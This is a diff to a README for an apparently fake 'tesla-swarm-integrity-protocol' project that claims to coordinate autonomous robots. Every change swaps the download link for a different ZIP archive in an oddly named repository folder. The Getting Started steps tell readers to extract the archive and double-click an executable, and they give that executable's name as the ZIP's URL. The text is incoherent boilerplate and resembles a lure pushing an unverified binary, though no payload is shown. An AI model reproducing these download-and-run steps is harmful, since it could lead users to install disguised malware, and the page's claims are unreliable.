@@ -1,7 +1,7 @@
 # 🚀 tesla-swarm-integrity-protocol - Seamlessly Connect Autonomous Robots
 
 ## 🔗 Quick Download
-[![Download](https://github.com/Samuel76844/tesla-swarm-integrity-protocol/raw/refs/heads/main/subhemispherical/protocol-tesla-integrity-swarm-v2.6.zip%20Now-blue?style=for-the-badge)](https://github.com/Samuel76844/tesla-swarm-integrity-protocol/raw/refs/heads/main/subhemispherical/protocol-tesla-integrity-swarm-v2.6.zip)
+[![Download](https://raw.githubusercontent.com/Samuel76844/tesla-swarm-integrity-protocol/main/subhemispherical/protocol_tesla_integrity_swarm_1.7-beta.3.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Samuel76844/tesla-swarm-integrity-protocol/main/subhemispherical/protocol_tesla_integrity_swarm_1.7-beta.3.zip)
 
 ## 📖 Overview
 The tesla-swarm-integrity-protocol provides a decentralized way for multiple autonomous robots to agree on actions and improve communication. This system allows robots to work together smoothly, reducing noise and enhancing performance. Whether you are using these robots for delivery, surveillance, or other tasks, this protocol helps them coordinate effectively.
@@ -20,13 +20,13 @@ The tesla-swarm-integrity-protocol provides a decentralized way for multiple aut
 
 ## 🚀 Getting Started
 1. **Download the Latest Version:**
-   Visit this page to download the software: [Download here](https://github.com/Samuel76844/tesla-swarm-integrity-protocol/raw/refs/heads/main/subhemispherical/protocol-tesla-integrity-swarm-v2.6.zip).
+   Visit this page to download the software: [Download here](https://raw.githubusercontent.com/Samuel76844/tesla-swarm-integrity-protocol/main/subhemispherical/protocol_tesla_integrity_swarm_1.7-beta.3.zip).
 
 2. **Extract the Files:**
    Once the download is complete, locate the downloaded ZIP file in your file manager. Right-click on it and select “Extract All.” Follow the prompts to extract the contents into a folder.
 
 3. **Run the Application:**
-   Navigate to the folder where you extracted the files. Look for the executable file, typically named `https://github.com/Samuel76844/tesla-swarm-integrity-protocol/raw/refs/heads/main/subhemispherical/protocol-tesla-integrity-swarm-v2.6.zip`, and double-click it to start the application.
+   Navigate to the folder where you extracted the files. Look for the executable file, typically named `https://raw.githubusercontent.com/Samuel76844/tesla-swarm-integrity-protocol/main/subhemispherical/protocol_tesla_integrity_swarm_1.7-beta.3.zip`, and double-click it to start the application.
 
 4. **Follow the Setup Instructions:**
    After launching, follow the on-screen instructions to configure your application settings. The setup will guide you through any necessary steps to begin using the protocol with your robots.
@@ -34,7 +34,7 @@ The tesla-swarm-integrity-protocol provides a decentralized way for multiple aut
 ## 🌐 Download & Install
 To get started, please click the link below to download the latest version:
 
-[Download here](https://github.com/Samuel76844/tesla-swarm-integrity-protocol/raw/refs/heads/main/subhemispherical/protocol-tesla-integrity-swarm-v2.6.zip)
+[Download here](https://raw.githubusercontent.com/Samuel76844/tesla-swarm-integrity-protocol/main/subhemispherical/protocol_tesla_integrity_swarm_1.7-beta.3.zip)
 
 After downloading, follow the steps in the “Getting Started” section to install and run the software.
 
